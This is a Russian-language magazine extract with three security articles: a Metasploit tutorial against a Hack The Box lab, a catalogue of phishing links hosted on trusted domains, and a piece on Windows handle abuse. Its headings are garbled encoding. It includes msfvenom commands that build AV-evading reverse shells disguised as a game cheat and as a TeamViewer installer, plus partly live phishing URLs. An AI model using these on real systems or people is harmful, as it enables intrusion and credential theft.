данные. Если нет, то про буем другие полезные наг рузки или ищем дру гой
эксплоит. Под робнее об этом поговорим дальше.
  Сразу скажу, что Metasploit на сегодняшний день серьезно уступает кон-
курентам (PoshC2, Covenant,  Sliver и дру гим). Слишком уж много в нем
накопилось устарев ших экспло итов. Соответственно, и пентестить с ним луч-
ше все го устарев шие приложения. Но для обучения Metasploit подходит
отлично, поэтому с него и начнем.
   Лично я использую его по большей части для генерации пейлоадов
с помощью msfvenom, об этом тоже поговорим дальше.
  Написан MSF на Ruby и взаимо действует с PostgreSQL. Эта инфа нам при-
годится при запуске.


ÇÀÏÓÑÊÀÅÌ MSF ÏÐÀÂÈËÜÍÎ

Предположим, что ты работаешь в Kali Linux, где MSF уже установлен. Также
нам понадобится PostgreSQL.


# Если PostgreSQL не установлена
sudo apt install postgresql
# Проверяем, работает ли
sudo service postgresql status
# Запускаем
sudo systemctl start postgresql
# Создаем базу данных для Metasploit
sudo msfdb init

База данных нам нужна для управле ния рабочи ми прос транства ми.
   Те перь запус каем сам Metasploit:


msfconsole

Поз драв ляю, вот ты и в Metasploit! Первым делом набирай help.





Это все основные коман ды фрей мворка, советую по ним пробежаться гла-
зами.





Дальше нам надо соз дать рабочее пространство, именно для него мы запус-
кали PostgreSQL (а еще для того, чтобы Metasploit быс трее запускался).


# Отобразим текущее рабочее пространство (* default)
workspace
# Добавим рабочее пространство под названием Lame
workspace -a Lame
# Переключимся на него
workspace Lame





Для чего нам рабочие пространства? В первую очередь — чтобы во время
работы не запутаться. Целей бывает мно го, и Metasploit будет хра нить полез-
ную информацию для каж дой из них. Например, ска ны Nmap.
   Кстати, давай сразу что-нибудь посканим. Я выб рал в качестве цели лабу
с Hack The Box под названием Lame.


db_nmap -sC -sV -A -Pn 10.129.45.31

Видим вот такой результат.





Те перь вво дим команду hosts.
   Что ж, основную инфу мы сохранили. Теперь пройдемся по структуре
Metasploit.





ÑÒÐÓÊÒÓÐÀ METASPLOIT

Metasploit состоит из семи разделов:
 • Exploits — это, считай, костяк фрей мворка, он вклю чает в себя эксплоиты
   на любой вкус и для любых платформ. О том, как они хранятся и как их
   искать, мы погово рим позже;
 • Auxiliary — вспо могательные модули, служат не для экс плуата ции, а ско-
   рее для обнаруже ния уяз вимостей, как пример — Nmap;
 • Post — пос тэксплуатация. То есть, когда систему уже ломану ли, можем
   исполь зовать штуки отсю да для работы с ней. По факту это тоже экспло-
   иты, но для системы, к которой у нас есть доступ;
 • Payloads — полез ные нагрузки. Это не экс пло иты, а ско рее вре доносный
   код на все случаи жизни. Например, для получе ния обратного шелла;
 • Encoders — кодировщики нагрузок. Приз ваны скрыть факт проник-
   новения от антивируса или обойти службы безопас ности;
 • Nops — модули из этого раздела зас тавляют про цессор ничего не делать
   в течение какого-то времени;
 • Evasion — укло нение от детекта. Сюда входят разные трюки для обхо да
   Microsoft Defender, файрволов и про чих защит Windows. Я этот модуль
   не буду рассмат ривать, так как тема уже не сов сем для нович ков.

Модули здесь стро го структуриро ваны. Например, рассмот рим расположе-
ние модуля, который нам потребуется для взлома Lame.





Важная ремарка: multi — значит для любой системы (если только для винды,
будет windows, для Unix — unix и так далее).
  Преж де чем читать дальше, тебе нужно выпол нить простое задание:


cd /usr/share/metasploit-framework

В Kali это дефолтная пап ка Metasploit. Заходи в нее и пробуй походить по раз-
делам и освоиться со струк турой. Это потом при годит ся.
  Но вернемся к самому Metasploit. Первая коман да, о которой нужно
знать, — это search. Дальше прос то вбиваем нужное нам название. У этой
коман ды есть дополнительные параметры, пробежимся по самым важным
из них:
 • type — из какого раз дела взять модуль;
 • cve — поиск по базе CVE;
 • platform — для какой платформы нужен экспло ит.

Нап ример, ищем эксплоиты для Samba, получившие CVE в 2007 году:


search type:exploit cve:2007 samba

Под робнее о воз можностях поис ка можешь узнать, набрав search -h.


ÝÊÑÏËÓÀÒÀÖÈß

Настало вре мя что-нибудь попентестить! Впрочем, не что-нибудь, а все ту же
машину Lame с Hack The Box, о которой я уже говорил. В этой лабе при сутс-
твует уязвимость CVE-2007-2447. Давай ее для начала найдем:


search CVE-2007-2447

Что бы начать работать с модулем, тебе нуж но выполнить команду use.





use 0

Здесь 0 — это порядковый номер в списке вывода команды search.
  Мож но еще выбрать модуль вот такой коман дой:


use exploit/multi/samba/usermap_script

В качестве параметра указан полный путь до экспло ита.
  Первое, что ты должен сделать после того, как перешел к модулю, — наб-
рать коман ду info. Она отображает базовую информацию о модуле. Далее
мы начинаем работать с самим модулем. Пишем


show options

Это покажет основные настрой ки модуля.





Давай разберемся, что это вооб ще за параметры:
 • RHOSTS — сюда будем вставлять апиш ник жер твы;
 • RPORT — порт, который мы ата куем;
 • Payload — нагрузка, которая будет использоваться. Обычно задана
  дефол тная, но иногда нужно будет менять;
 • LHOST — наш локальный хост, куда будет при ходить отстук;
 • LPORT — порт, на который при дет отстук.

Что бы выставить какой-то из параметров, нужно ввести команду


set [параметр] значение

Нап ример:


set RHOSTS 10.129.45.31

Еще сразу запом ни команду show  payloads, она показывает нагрузки,
которые можно при менять с выб ранным модулем. То есть мы можем
поменять дефолтный пейлоад на тот, который захотим (разуме ется, если он
ком бинируется). Нап ример:


set PAYLOAD payload/cmd/unix/reverse_python

В нашем случае этот пейлоад не сра бота ет, я показал его как пример. Ста вим
пре дыдущую нагрузку:


set PAYLOAD payload/cmd/unix/reverse_netcat

Те перь перед запуском программы переп роверя ем все параметры:


show options




                        Уч ти, что в некоторых экспло итах будет мало
                      просто указать RHOSTS и LHOST.


Парамет ры корректны, зна чит, мож но запускать!
  Пишем run или exploit.





Всё, мы внутри!
   Казалось бы, тут можно и закончить статью. Но у Metasploit есть еще нес-
колько очень инте ресных фич.


ÑÅÑÑÈÈ

Что бы сохранить сес сию в бэкгра унд, можешь нажать Ctrl-Z. А чтобы про-
верить ее, вве ди команду sessions.





Что бы вернуться к сессии, пиши sessions -i [ID нужной сессии].


sessions -i 3

Сессии пригодятся тебе при работе с модулями из раздела POST. Пред-
положим, у нас есть сес сия с ID 10 и нам нужно най ти всех пользователей
на машине с Linux:


use post/linux/gather/enum_users_history
set session 10
show options

Всё корректно, мож но запускать: run.





ÏÅÉËÎÀÄÛ STAGED È NON-STAGED

Бы ло бы преступле нием не упомянуть типы пейлоадов. Их тут два:
 • staged — содер жит весь код наг рузки, ну например, весь код реверс-шел-
   ла;
 • non-staged — тут гораздо интерес нее, такой пейлоад содержит код,
   который сам заг ружает полезную нагрузку на хост.

Пейлоады типа non-staged поз воляют куда легче обходить антивирусы и фай-
рво лы, потому что их размер значительно мень ше и они не содержат сам код
злов реда.


METERPRETER

Это версия командной обо лочки Metasploit, но пред назначен ная для загрузки
на машину-жертву. Например, с ее помощью можно дампить пароли, подгру-
жать и эксфильтровать файлы, сниффить, запускать исполня емые файлы
и еще много чего веселого. Также ее труд но обнаружить стандартны ми
средства ми защиты.
  Для начала советую запомнить нес колько команд, которые пригодятся
при работе с Meterpreter:
 • help — выводит все основные коман ды Meterpreter;
 • run <scriptname> — запускает скрипт Meterpreter;
 • upload <filename> — заг ружает файл на ата куемую машину;
 • download <filename> — скачивает файл с ата куемой машины;
 • shell — акти вирует обычную коман дную обо лочку;
 • execute — выполняет команду на целевой системе;
 • ps — вывод всех про цессов;
 • sysinfo — инфа о системе, на которую мы заб рались;
 • getuid —  отображает  пользователя,  от имени  которого  запущен
   Metasploit.


MSFVENOM

Ну и наконец, поговорим о msfvenom. Это тулза для генерации пейлоадов (к
слову,  очень  удобная).  Например,  нуж но  нам  сге нерить  бинар ный
реверс-шелл для Linux. Делается это так:


msfvenom -p linux/x86/meterpreter/reverse_tcp \
         LHOST=<твой_IP> LPORT=<твой_порт> \
         -f elf -o CheatNaBrawlStars.elf -e x86/shikata_ga_nai


msfvenom -p linux/x86/meterpreter/reverse_tcp \
         LHOST=<твой_IP> LPORT=<твой_порт> \
         -x \~/Downloads/TeamViewer_Setup.exe \
         -e x86/shikata_ga_nai -a x86 \
         --platform windows \
         -o TeamViewer_Setup.exe -i 100

Пройдемся по параметрам:
 • -p — пей лоад;
 • -f — расширение файла;
 • -o — название фай ла;
 • -e — шифрование, обфускация или кодиров ка;
 • -x — путь к исполняемо му файлу, он будет взят как осно ва для составле-
   ния пейлоада, и это понизит вероятность обнаруже ния в несколько раз;
 • -a — архи тектура, под которую будет соз дан пейлоад;
 • --platform — платформа, под которую будет соз дан пейлоад.


ÂÛÂÎÄÛ

На этом наш краткий экскурс закончен, не забудь сохранить рабочее прос-
транство:


db_export -f xml -a /путь/к/файлу.xml

Напос ледок — небольшой список легких машинок с Hack The Box для отра-
бот ки навыков: Lame, Legacy, Optimum, Arctik и Blue.
ВЗЛОМ





Что такое фишинг, знает и стар и млад,
но пользовате ли все равно про должают
попадать ся на улов ки зло умыш ленников.
В этой статье мы рассмотрим фишин говые
ссылки, а точ нее, спо собы их мас кировки         Юрий Другач                                                                                     Автор книги о социальной
с  исполь зовани ем офи циальных  сайтов      инженерии «Контролируемый                                                                                              взлом»
известных ком паний и сервисов.




                   В информацион ных целях эта статья содержит
                      ссылки  на  мошен ничес кие  ресурсы,  причем
                        некоторые из них еще работа ют. Текст статьи
                      доступен только подписчикам «Хакера». Если все
                    же собира ешься посещать эти сай ты, не вводи
                       никакие лич ные дан ные в расположен ные там
                    формы.


Открытым редиректом в «1С-Бит рикс» уже никого не уди вишь. Давай лучше
рас смот рим, как киберпреступники умуд ряются использовать  archive.org,
evernote.com, bing.com, microsoft.com, adobe.com и другие трастовые домены
для того, что бы обмануть доверчивых пользователей.
   Если эту статью читают специалис ты по информационной безопасности,
рекомендую им проверить, как на подобные ссылки будут реагировать поль-
зователи. Ведь обычно их учат различать подозрительную ссылку в письме,
но мало кто про веряет, на каком имен но сай те его просят ввести свои учет-
ные дан ные после перехода. По этой же причине статья будет полезна и пен-
тестерам. Ведь это удоб но: не нужно регис трировать домен 0utl00k.com,
если  вместо  него  можно  использовать  под домен  на  офи циаль ном
outlook.com.


ÑÅÐÂÈÑÛ ÄËß ØÅÐÈÍÃÀ ÔÀÉËÎÂ

Нач нем  с фишинговой ссылки, нацелен ной  на  кражу  учетных данных
от Outlook, c легитимным поддоменом indd.adobe.com:


хttps://indd.adobe.com/view/f894dec3-4cc0-4077-954c-d72b229dfc54




                     Про токол HTTPS  во  всех ссыл ках намеренно
                      заменен несущес твующим XTTPS.


При переходе по ссылке мы сначала попадаем на страницу-прокладку.





Есть и другой вари ант.





Пос ле нажатия на кнопку нас проверяют с исполь зованием Cloudare.





И лишь после этого мы попада ем на классическую фишинговую форму.





Следующий вариант мошенничес кого сообщения использует легитимный
сервис для отправ ки вложений в виде ссылки. Жертва получа ет подоб ную
ссылку:


xttps://docsend.com/view/z4zk3d6c8wsnyppt

При переходе по ней авто матичес ки загружается HTML-файл вот такого
содержания.





ÐÅÊËÀÌÍÛÅ ÑÅÒÈ

А вот ссылка, соз данная с помощью рекламного сер виса Google. Всю ссылку
копиро вать не буду, она о-о-очень длин ная, но ее смысл будет понятен, если
вни мательно посмотреть и на сокращенный вари ант:


https://googleads.g.doubleclick.net/dbm/clk?sa=L&ai=CCsUXxuNtZbXQGI-
Q7gPhv6PQCqO55c50zMHcpYwQr4G649cCEAEgjr2eHGCVgoCAmAegAayyj6AByAEJqAMB
yAObBKoEhg...

Пос ле перехода по ссылке нас также про веряют на бота с использовани ем
Cloudare, затем выполняется редирект на фишинговую форму Microsoft.





ÑÅÐÂÈÑÛ ÎÏÐÎÑÎÂ

В следующем случае Microsoft сам помогает «сфишить» аккаунт от сво его же
сервиса. Пользователю отправляют ссылку на сервис для проведения опро-
сов Dynamic 365 Customer Voice:


xttps://ncv.microsoft.com/Xd4E8g0inD

Пос ле перехода по ссылке попада ем на страницу сервиса.





На этой странице мы видим другую ссыл ку, ведущую на проверку в исполне-
нии Cloudare. И вот уже перед нами фишин говая фор ма в сти ле Microsoft.





Такая атака впер вые засветилась в августе 2022 года, но этот спо соб фишин-
га продол жают эксплуати ровать и в декаб ре 2023-го.


ÂÅÁ-ÏÐÈËÎÆÅÍÈÅ

В  статье  «Искусство маскировки.  Как мошен ники  прячут  свои  сайты
в интерне те» мы рассматривали, на каких доменах могут размещать ся вре-
доносные ресур сы, поэтому поддоменами на легитимных сайтах нас уже
не уди вить. Но мимо фишингового сай та, имитирующего исконно российский
сервис, я пройти не смог:


xttps://glen-sulky-angora.glitch.me/





В данном случае зло умыш ленник использовал сервис для соз дания веб-при-
ложений, чтобы разместить свою вредоносную наг рузку для всех желающих
потерять учетку на сай те mail.ru.


ÏÎÈÑÊÎÂÛÅ ÑÈÑÒÅÌÛ

А вот так используют Bing для обхода первичных фильтров межсетевого экра-
на (конеч но, если bing.com не занесен у тебя в чер ный спи сок):


xttps://www.bing.com/ck/a?!&&
p=eaab4245dac9a54dJmltdHM9MTcwMTk5MzYwMCZpZ3VpZD0xMmIyMDE0YS1lOTQyLTZ
hZjItMGI0YS0xMmFiZTg4ODZiOTUmaW5zaWQ9NTEzNQ&
ptn=3&ver=2&hsh=3&fclid=12b2014a-e942-6af2-0b4a-12abe8886b95&
u=a1aHR0cDovL2ZyZWVkb21zcGVha3NjYXJlLmNvbS9yZWdpc3RyYXRpb24v#evil@hac
ker.
com

Пе реходим по ссылке и попадаем на фишин говый ресурс.





AMP-ÑÒÐÀÍÈÖÛ

В следующем примере технология AMP от Google помога ет злоумыш леннику
закеши ровать свою стра ницу, а потом рассылать фишинговую ссыл ку ничего
не подоз ревающим поль зователям:


xttps://www.google.com/amp/s/pub-2cccc10251dd4525b4619dce6ade915b.r2.
dev/owatelegram.html#aXJpcy5uZXVzc25lckB3aW5rbGVyc2NodWxiZWRhcmYuY29t

Че рез редирект ссылка ведет на фишинговую стра ницу Outlook.





ÏÎ×ÒÎÂÛÅ ÑÅÐÂÈÑÛ

Ссылка слишком длинная, я опубликую лишь ее часть, но очевид но, что
Outlook спо собствует распространению фишинга, оставляя возможность
подоб ных редиректов:


xttps://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fp.
feedblitz.com%2Ft3.asp%3F%2F1081591%2F102442729%2F7821567_%2F~feeds.
feedblitz.com%2F~%2Ft%2F0%2F0%2Fsethsblog%2Fposts%2F~%2F%2Fr20.rs6.
net%2Ftn.
jsp%3Ff%3D001vFHMoPyMo0WrLNfpX5KrbtnufSjk2FOwtHR22KMN3Rk2jm9egqQ...

У поль зовате лей Oﬃce 365 подозрительные ссылки в электронных письмах
заменяются ссылками вида https://*.safelinks.protection.outlook.
com/*: то, что нужно для зло умыш ленника, что бы отправить себе ссылку!
Outlook ее замас кирует под легитимную, и после этого ее можно выслать
жертве.
  В пред став ленном при мере интересно то, что пос ле нес кольких редирек-
тов мы попадаем на форму авториза ции якобы от Microsoft c предзапол-
ненным адресом robin_kiziak@vfc.com.





Однако после этого нас переадресовывает на фор му уже с логотипом ком-
пании жертвы.





Скрипт злоумыш ленни ка чекает при надлежность почты robin_kiziak@vfc.
com к сер висам Microsoft и в случае успе ха подкачивает логотип атакуемой
ком пании для боль шей прав доподоб ности. Надеюсь, Робин не попался
на фишинг, а мы дви гаем ся дальше.


ÑÅÐÂÈÑÛ ÄËß ÑÎÂÌÅÑÒÍÎÉ ÐÀÁÎÒÛ

Вот таким документом на днях поделился «коллега-хакер» с доверчивыми
поль зовате лями:


xttps://share.nuclino.com/p/Hangar-38-NQPTdHWF_sOk8OLF47mDEm





Открыв ссылку в документе, мы попада ем на уже при вычную фишинговую
форму в стилистике Microsoft.


ÑÅÐÂÈÑÛ ÄËß ÂÈÇÓÀËÈÇÀÖÈÈ ÄÀÍÍÛÕ

Здесь злоумыш ленник использовал сервис Looker Studio от Google:


xttps://lookerstudio.google.com/s/inARhcBTd642





По ссылке мы снова попадаем на фор му якобы от кор порации Microsoft, толь-
ко теперь зло умышленник был ленивый и не вставил прокладку в виде
Cloudare.


ÑÅÐÂÈÑÛ ÄËß ÇÀÌÅÒÎÊ

Вот так Evernote помогает создать ссылку на любой интернет-ресурс —
разуме ется, и на фишинговый тоже:


xttps://www.evernote.com/shard/s429/client/snv?isnewsnv=true&noteGuid
=edcd788b-1388-90b4-3dbe-6a4c1d0839fc&noteKey=
2C0bc4FotYyqz224bXZZxtFnmB8_uLv4JKgimuZDrpC4ldrauOW4KhjldQ&sn=
https%3A%2F%2Fwww.evernote.com%2Fshard%2Fs429%2Fsh%2Fedcd788b-1388-
90b4-3dbe-6a4c1d0839fc%2F2C0bc4FotYyqz224bXZZxtFnmB8_
uLv4JKgimuZDrpC4ldrauOW4KhjldQ&title=
Sylvie%2BDUPONT%2Ba%2Bpartag%25C3%25A9%2Bun%2Bdocument%2Bvia%2BOneDri
ve

По падаем на легитим ную страницу-прокладку, которая содер жит ссылку
на фишин говый сайт.





INTERNET ARCHIVE

Следующий пример фишинга использует в сво их коварных целях популярный
сервис Internet Archive:


xttps://ia601207.us.archive.org/17/items/Lnkdsof/Lnkdsof.shtml





ÍÀÏÎÑËÅÄÎÊ

Не рек ламы ради, а для просвещения — тысячи дру гих при меров фишинга (и
не толь ко) ты можешь найти в интерактивной службе поис ка вредоносных
программ https://any.run.





Бесплатной версии вполне достаточно, чтобы, помимо фишин говых сайтов,
отыскать и  скачать пос леднюю версию  экзотического шифровальщика
или изучить, какие учебные ата ки проводят безопасники в рамках мероп-
риятий по повышению осведомленности.
ВЗЛОМ





В Windows все взаимо действие програм-
мно го кода с сис темой пос троено на хен-
длах. Можно атаковать ком поненты сис-
темы, ковырять ядро, но что, если атаковать
сами дес крип торы? В этой статье я разоб-         MichelleVermishelle                                                                                       @Michaelzhm
рал нес коль ко вариантов атак на них.                     michael.zhmailo@yandex.ru


Хендлы (они же дескрипторы) в Windows — это один из важных кам ней в фун-
дамен те системы. На хендлах построено и основывается все взаимодей ствие
из прог раммного кода с компонентами Windows. Именно благодаря дес крип-
торам ядро понима ет, к какому объекту мы хотим обратиться и с каким уров-
нем доступа. Хендл обычно можно получить с помощью стандартных функций.
На файл — через CreateFile(), на LSA — через LsaOpenPolicy(). В Windows
очень много раз ных объектов, с которыми мож но взаимодей ствовать. Ты
можешь открыть список WinAPI, ткнуть на любой интересу ющий компонент
и убедиться, что самой основной и важ ной апи хой будет API для получе ния
хендла на нужный объект. Не получил хендл — не смог взаимо дей ствовать
с системой.
  Знаешь ли ты, что есть атаки и на сами хендлы?




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



ÈÍÒÅÐÅÑÍÛÅ ÕÅÍÄËÛ

Во-первых, сле дует определиться с тем, что мы ищем. Нас инте ресуют
далеко не все хендлы. Конечно, приоритет нее все го процессы и потоки. Вза-
имо действие с ними позволит запустить шелл-код. Впрочем, тут опять не все
так гладко. Полученный хендл должен иметь хотя бы право PROCESS_VM_WRITE
(для про цесса) или THREAD_SET_CONTEXT (для потока). Кстати, нам подойдут
и хендлы на секции памяти и — в исклю читель ных слу чаях — на конкрет ные
файлы или ключи реестра.


ÈÇÓ×ÅÍÈÅ ÕÅÍÄËÎÂ ÏÐÎÖÅÑÑÀ

Пе ред тем как приступить, можем гля нуть хендлы конкретных процес сов
в системе. Это позволит наметить дальнейший вектор раз вития атаки. Удоб-
нее все го, как мне кажет ся, использовать утилиту Process Hacker.





                     Изучение хендлов процес са

Есть также System Explorer и Sysinternals, но я ими пользовал ся не очень мно-
го.





          Вывод инструмента Handle из пакета Sysinternals




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





         КАК ЗЛОУПОТРЕБЛЯТЬ ХЕНДЛАМИ
                        В WINDOWS





HANDLE DUPLICATING

Это самая первая атака на хендлы. Осно вана она по боль шей части на фун-
кции  DuplicateHandle()  и  ее  более  низкоуров невых  аналогах  вроде
NtDuplicateObject().
   Взглянем на про тотип функции.


BOOL DuplicateHandle(
  [in]  HANDLE   hSourceProcessHandle,
  [in]  HANDLE   hSourceHandle,
  [in]  HANDLE   hTargetProcessHandle,
  [out] LPHANDLE lpTargetHandle,
  [in]  DWORD    dwDesiredAccess,
  [in]  BOOL     bInheritHandle,
  [in]  DWORD    dwOptions
);

 • hSourceProcessHandle — хендл процесса, из которого тре бует ся ско-
   пиро вать хендл. Дол жен иметь маску дос тупа PROCESS_DUP_HANDLE;
 • hSourceHandle — хендл, который нуж но скопировать;
 • hTargetProcessHandle — процесс, в который нужно скопировать
   хендл;
 • lpTargetHandle — куда класть ско пированный хендл;
 • dwDesiredAccess — флаги дос тупа;
 • bInheritHandle — наследу емый ли дескриптор, то есть можно ли его
   передавать в дочерние про цессы;
 • dwOptions — дополнительные параметры.

Под робнее каждый аргумент можно изу чить в официальной документации.
   Итак, вся атака зак лючается в том, что мы находим процессы, на которые
можем зап росить хендл с маской PROCESS_DUP_HANDLE, затем копируем их
хендлы, изучаем, на что они указывают, после чего экс плуати руем! Например,
на процесс victim.exe из нашего процес са target.exe можно успешно
получить  хендл  с  нужной  маской.  После  копирования  дес крипторов
из целевого процесса обна руживаем, что у нас есть дес криптор процесса
lsass.exe! Как следствие, успешно дампим процесс.
  Конечно, в целевом про цес се может быть ука зана плохая маска дос тупа,
которая не подходит для дампа процесса. Тем не менее, если у нас есть
хендл, мы можем распарсить его и извлечь мас ку доступа, используемую
для получе ния этого хен дла.
   Здесь нам поможет функция  NtQueryObject() и передача  структуры
PUBLIC_OBJECT_BASIC_INFORMATION.


#include <iostream>
#include <windows.h>
#include <winternl.h>


#pragma comment(lib, "ntdll.lib")


void ParseAccessMask(ACCESS_MASK accessMask) {
  if ((accessMask & GENERIC_READ) == GENERIC_READ) std::cout <<
"GENERIC_READ ";
  if ((accessMask & GENERIC_WRITE) == GENERIC_WRITE) std::cout <<
"GENERIC_WRITE ";
  if ((accessMask & GENERIC_EXECUTE) == GENERIC_EXECUTE) std::cout <<
"GENERIC_EXECUTE ";
  if ((accessMask & GENERIC_ALL) == GENERIC_ALL) std::cout <<
"GENERIC_ALL ";


  if ((accessMask & PROCESS_CREATE_PROCESS) == PROCESS_CREATE_PROCESS
) std::cout << "PROCESS_CREATE_PROCESS ";
  if ((accessMask & PROCESS_TERMINATE) == PROCESS_TERMINATE) std::
cout << "PROCESS_TERMINATE ";
  if ((accessMask & PROCESS_SUSPEND_RESUME) == PROCESS_SUSPEND_RESUME
) std::cout << "PROCESS_SUSPEND_RESUME ";
  if ((accessMask & PROCESS_QUERY_INFORMATION) ==
PROCESS_QUERY_INFORMATION) std::cout << "PROCESS_QUERY_INFORMATION ";
  if ((accessMask & PROCESS_SET_INFORMATION) ==
PROCESS_SET_INFORMATION) std::cout << "PROCESS_SET_INFORMATION ";


  std::cout << std::endl;
}



int main() {
  HANDLE hProcess = GetCurrentProcess();


  ULONG returnLength = 0;
  PUBLIC_OBJECT_BASIC_INFORMATION obi;


  NTSTATUS status = NtQueryObject(
    hProcess,
    ObjectBasicInformation,
    &obi,
    sizeof(obi),
    &returnLength);


  if (NT_SUCCESS(status)) {
    std::cout << "Granted Access: " << std::hex << obi.GrantedAccess
<< std::endl;
    ParseAccessMask(obi.GrantedAccess);
  }
  else {
    std::cerr << "NtQueryObject failed with status: " << std::hex <<
status << std::endl;
  }


  CloseHandle(hProcess);


  return 0;
}





                        Пример вывода

Есть проблема: мы пар сим маски, совершенно забывая о том, что мас ки дос-
тупа могут иметь перекрывающиеся зна чения. Например, у процес са есть
PROCESS_VM_READ, у потока — THREAD_SET_CONTEXT, а эти оба значения ука-
зывают на 0x0010, поэтому нашу функцию парсинга маски доступа нужно
модифи цировать, научив распозна вать переданный хендл.
  Далеко ходить не надо — используем ту же фун кцию NtQueryObject(),
только будем переда вать ей структуру PUBLIC_OBJECT_TYPE_INFORMATION.


typedef struct __PUBLIC_OBJECT_TYPE_INFORMATION {
  UNICODE_STRING TypeName;
  ULONG          Reserved[22];
} PUBLIC_OBJECT_TYPE_INFORMATION, *PPUBLIC_OBJECT_TYPE_INFORMATION;

Здесь будем отталки ваться только от поля TypeName. Именно там содер жится
тип объекта, на который ука зывает хендл.
  Нам оста ется лишь несколько поп равить код.


#include <iostream>
#include <windows.h>
#include <winternl.h>


#pragma comment(lib, "ntdll.lib")


std::wstring GetHandleType(HANDLE handle) {
  NTSTATUS status;
  ULONG returnLength;
  std::wstring handleType;
  ULONG bufferSize = sizeof(PUBLIC_OBJECT_TYPE_INFORMATION) + 1024;
  PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (
PPUBLIC_OBJECT_TYPE_INFORMATION) new UCHAR[bufferSize];


  if (!objectTypeInfo) {
    std::cerr << "Memory allocation failed" << std::endl;
    return handleType;
  }


  status = NtQueryObject(handle, ObjectTypeInformation,
objectTypeInfo, bufferSize, &returnLength);


  if (NT_SUCCESS(status)) {
    handleType.assign(objectTypeInfo->TypeName.Buffer, objectTypeInfo
->TypeName.Length / sizeof(WCHAR));
  }
  else {
    std::cerr << "Failed to get object type information" << std::endl
;
  }


  delete[](UCHAR*)objectTypeInfo;
  return handleType;
}


void ParseAccessMask(HANDLE handle, ACCESS_MASK accessMask) {
  std::wstring handleType = GetHandleType(handle);
  std::wcout << L"Handle Type: " << handleType << std::endl;


  if (handleType == L"Process") {
    if ((accessMask & PROCESS_ALL_ACCESS) == PROCESS_ALL_ACCESS) std:
:wcout << L"PROCESS_ALL_ACCESS ";
    if ((accessMask & PROCESS_CREATE_PROCESS) ==
PROCESS_CREATE_PROCESS) std::wcout << L"PROCESS_CREATE_PROCESS ";
    if ((accessMask & PROCESS_CREATE_THREAD) == PROCESS_CREATE_THREAD
) std::wcout << L"PROCESS_CREATE_THREAD ";
    if ((accessMask & PROCESS_DUP_HANDLE) == PROCESS_DUP_HANDLE) std:
:wcout << L"PROCESS_DUP_HANDLE ";
    if ((accessMask & PROCESS_QUERY_INFORMATION) ==
PROCESS_QUERY_INFORMATION) std::wcout << L"PROCESS_QUERY_INFORMATION
";
    if ((accessMask & PROCESS_QUERY_LIMITED_INFORMATION) ==
PROCESS_QUERY_LIMITED_INFORMATION) std::wcout <<
L"PROCESS_QUERY_LIMITED_INFORMATION ";
    if ((accessMask & PROCESS_SET_INFORMATION) ==
PROCESS_SET_INFORMATION) std::wcout << L"PROCESS_SET_INFORMATION ";
    if ((accessMask & PROCESS_SET_QUOTA) == PROCESS_SET_QUOTA) std::
wcout << L"PROCESS_SET_QUOTA ";
    if ((accessMask & PROCESS_SUSPEND_RESUME) ==
PROCESS_SUSPEND_RESUME) std::wcout << L"PROCESS_SUSPEND_RESUME ";
    if ((accessMask & PROCESS_TERMINATE) == PROCESS_TERMINATE) std::
wcout << L"PROCESS_TERMINATE ";
    if ((accessMask & PROCESS_VM_OPERATION) == PROCESS_VM_OPERATION)
std::wcout << L"PROCESS_VM_OPERATION ";
    if ((accessMask & PROCESS_VM_READ) == PROCESS_VM_READ) std::wcout
<< L"PROCESS_VM_READ ";
    if ((accessMask & PROCESS_VM_WRITE) == PROCESS_VM_WRITE) std::
wcout << L"PROCESS_VM_WRITE ";
    if ((accessMask & SYNCHRONIZE) == SYNCHRONIZE) std::wcout <<
L"SYNCHRONIZE ";
  }
  else if (handleType == L"Thread") {
    if ((accessMask & THREAD_ALL_ACCESS) == THREAD_ALL_ACCESS) std::
wcout << L"THREAD_ALL_ACCESS ";
    if ((accessMask & THREAD_DIRECT_IMPERSONATION) ==
THREAD_DIRECT_IMPERSONATION) std::wcout <<
L"THREAD_DIRECT_IMPERSONATION ";
    if ((accessMask & THREAD_GET_CONTEXT) == THREAD_GET_CONTEXT) std:
:wcout << L"THREAD_GET_CONTEXT ";
    if ((accessMask & THREAD_IMPERSONATE) == THREAD_IMPERSONATE) std:
:wcout << L"THREAD_IMPERSONATE ";
    if ((accessMask & THREAD_QUERY_INFORMATION) ==
THREAD_QUERY_INFORMATION) std::wcout << L"THREAD_QUERY_INFORMATION ";
    if ((accessMask & THREAD_QUERY_LIMITED_INFORMATION) ==
THREAD_QUERY_LIMITED_INFORMATION) std::wcout <<
L"THREAD_QUERY_LIMITED_INFORMATION ";
    if ((accessMask & THREAD_SET_CONTEXT) == THREAD_SET_CONTEXT) std:
:wcout << L"THREAD_SET_CONTEXT ";
    if ((accessMask & THREAD_SET_INFORMATION) ==
THREAD_SET_INFORMATION) std::wcout << L"THREAD_SET_INFORMATION ";
    if ((accessMask & THREAD_SET_LIMITED_INFORMATION) ==
THREAD_SET_LIMITED_INFORMATION) std::wcout <<
L"THREAD_SET_LIMITED_INFORMATION ";
    if ((accessMask & THREAD_SET_THREAD_TOKEN) ==
THREAD_SET_THREAD_TOKEN) std::wcout << L"THREAD_SET_THREAD_TOKEN ";
    if ((accessMask & THREAD_SUSPEND_RESUME) == THREAD_SUSPEND_RESUME
) std::wcout << L"THREAD_SUSPEND_RESUME ";
    if ((accessMask & THREAD_TERMINATE) == THREAD_TERMINATE) std::
wcout << L"THREAD_TERMINATE ";
  }
  std::wcout << std::endl;
}


int main() {
  //HANDLE hProcess = GetCurrentProcess();
  HANDLE hProcess = GetCurrentThread();
  ULONG returnLength = 0;
  PUBLIC_OBJECT_BASIC_INFORMATION obi;


  NTSTATUS status = NtQueryObject(
    hProcess,
    ObjectBasicInformation,
    &obi,
    sizeof(obi),
    &returnLength);


  if (NT_SUCCESS(status)) {
    std::cout << "Granted Access: " << std::hex << obi.GrantedAccess
<< std::endl;
    ParseAccessMask(hProcess, obi.GrantedAccess);
  }
  else {
    std::cerr << "NtQueryObject failed with status: " << std::hex <<
status << std::endl;
  }


  CloseHandle(hProcess);


  return 0;
}





